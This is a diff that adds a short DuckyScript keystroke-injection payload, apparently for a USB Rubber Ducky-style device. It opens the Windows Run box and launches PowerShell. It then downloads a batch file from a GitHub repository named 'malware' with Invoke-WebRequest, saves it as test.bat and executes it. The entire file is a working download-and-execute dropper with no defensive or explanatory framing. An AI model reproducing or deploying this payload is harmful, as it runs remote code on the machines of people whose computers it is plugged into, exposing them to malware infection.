@@ -1,0 +1,12 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://github.com/malwaresuca/malware/raw/main/riproduci_audio.bat" -OutFile "test.bat"
+DELAY 500
+ENTER
+DELAY 1500
+STRING ./test.bat
